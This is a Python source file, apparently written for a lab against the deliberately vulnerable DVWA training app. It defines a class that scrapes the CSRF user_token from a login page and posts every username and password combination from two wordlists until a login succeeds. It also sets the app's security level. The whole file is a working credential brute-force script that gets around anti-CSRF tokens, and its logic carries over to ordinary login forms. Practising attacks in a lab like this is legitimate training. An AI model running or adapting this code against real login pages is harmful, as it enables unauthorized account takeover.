import requests
import re


class BruteForceDVWA:

    def __init__(self, username_wordlist = None, password_wordlist = None, url = None, session = requests.Session()):
        self.session = session
        self.username_wordlist = username_wordlist
        self.password_wordlist = password_wordlist
        self.url = url

    def find_user_token(self, login_page):
        match = re.search(r"name=['\"]user_token['\"]\s*value=['\"]([a-f0-9]+)['\"]\s*", login_page)
        if match:
            user_token = match.group(1)
            return user_token
        else:
            return 0

    def try_login(self, username: str, password: str, url: str):
        login_page = self.session.get(url)
        user_token = self.find_user_token(login_page.text)
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }
        response = self.session.post(
            url=url,
            data=login_data
        )
        if "CSRF token is incorrect" in response.text or "Login failed" in response.text:
            return False
        else:
            return (username, password)
        
    def brute_force_login(self):
        if self.username_wordlist is None or self.password_wordlist is None:
            raise ValueError("Username and password wordlists must be provided.")
        if self.url is None:
            raise ValueError("URL must be provided.") 
        with open(self.username_wordlist, 'r') as user_file, open(self.password_wordlist, 'r') as pass_file:
            usernames = [line.strip() for line in user_file]
            passwords = [line.strip() for line in pass_file]

        for username in usernames:
            for password in passwords:
                result = self.try_login(username, password, self.url)
                if result is not False:
                    return result
        return None
    
    def set_security_level(self, level='high', url = None):
        if url is None:
            raise ValueError("URL must be provided.")
        response = self.session.get(
            url=url
        )
        token = self.find_user_token(response.text)
        self.session.post(
            url=url,
            data={
                'seclev_submit': 'Submit',
                'security': level,
                'user_token': token
            }
        )